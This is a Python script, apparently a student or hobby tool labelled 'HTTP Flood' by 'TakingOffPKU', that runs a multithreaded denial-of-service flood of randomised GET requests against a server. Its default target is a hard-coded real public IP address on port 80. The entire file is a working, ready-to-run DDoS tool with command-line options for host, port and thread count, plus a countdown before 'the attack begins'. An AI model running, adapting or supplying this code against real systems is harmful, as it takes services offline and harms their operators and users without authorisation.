# -*- coding: utf-8 -*-
"""
Created on Sun May 20 19:37:42 2018

@author: DrLC
"""

import socket
import string
import random
import sys
import threading
import time

THREAD_DEFAULT = 1000
TARGET_DEFAULT = "47.94.138.231"
PORT_DEFAULT = 80

def print_help():
    
    print ()
    print ("+--------------------------+")
    print ("|                          |")
    print ("|     HTTP Flood           |")
    print ("|                          |")
    print ("|       by TakingOffPKU    |")
    print ("|                          |")
    print ("+--------------------------+")
    print ()
    print ("DDoS the target server process with toy-like HTTP Flood.")
    print ()
    print ("Use the following command to start attacking.")
    print ("  python3 %s" % (sys.argv[0]))
    print ("Optional arguments are:")
    print ("  -H or --host\tIP address of the server.")
    print ("  -P or --port\tPort of the server.")
    print ("  -T or --thread\tMultithread.")
    print ("Example:")
    print ("  python3 %s -H TARGET_IP -P TARGET_PORT -T N_THREAD"
           % (sys.argv[0]))
    print ()
    
def getopt(ARGS):
    
    if '-h' in ARGS or '--help' in ARGS:
        try:
            assert False
        except:
            print_help()
            exit(0)
    ret = {"host": TARGET_DEFAULT,
           "port": PORT_DEFAULT,
           "thread": THREAD_DEFAULT}
    for i in range(1, len(ARGS)):
        if i % 2 == 1:
            if ARGS[i] in ['-H', '--host']:
                ret['host'] = str(ARGS[i+1])
            if ARGS[i] in ['-P', '--port']:
                ret['port'] = int(ARGS[i+1])
            if ARGS[i] in ['-T', '--thread']:
                ret['thread'] = int(ARGS[i+1])
            else:
                try:
                    assert False
                except:
                   print_help()
                   exit(0)
    return ret
    
class sendGET(threading.Thread):

    THREAD = 0
    
    def __init__(self, target, port):
        try:
            self.__target = target
            self.__port = port
            sendGET.THREAD += 1
            threading.Thread.__init__(self)
        except KeyboardInterrupt:
            print ("\nHTTP flood attack ends!")
            exit(0)
        
    def __del__(self):
        try:
            sendGET.THREAD -= 1
        except KeyboardInterrupt:
            print ("\nHTTP flood attack ends!")
            exit(0)
        
    def run(self):
        try:
            #print ("\r%d threads running" % sendGET.THREAD, end="")
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((self.__target, self.__port))
            tmp = ''.join(random.sample(string.ascii_letters+string.digits+string.punctuation,
                                        random.randint(0,10)))
            http_get = 'GET /' + tmp + ' HTTP/1.1\r\n'
            sock.send(bytes(http_get, encoding='utf-8'))
            return
        except KeyboardInterrupt:
            print ("\nHTTP flood attack ends!")
            exit(0)
        except socket.error:
            pass
            
if __name__ == "__main__":
    
    args = getopt(sys.argv)
    print ()
    print ("+--------------------------+")
    print ("|                          |")
    print ("|     HTTP Flood           |")
    print ("|                          |")
    print ("|       by TakingOffPKU    |")
    print ("|                          |")
    print ("+--------------------------+")
    print ()
    print ("Host: %s" % args["host"])
    print ("Port: %d" % args["port"])
    print ("Thread: %d" % args["thread"])
    print ()
    print ("HTTP flood attack will begin in")
    countdown = 5
    for i in range(countdown, 0, -1):
        tmp_str = '\r'
        for j in range(countdown, i-1, -1):
            tmp_str += str(j)+"..."
        print (tmp_str, end="")
        time.sleep(1)
    print ("\nHTTP flood attack begins!")

    while True:
        try:
            if sendGET.THREAD <= args['thread']:
                tmp = sendGET(args['host'], args['port'])
                tmp.start()
        except KeyboardInterrupt:
            print ("\nHTTP flood attack ends!")
            exit(0)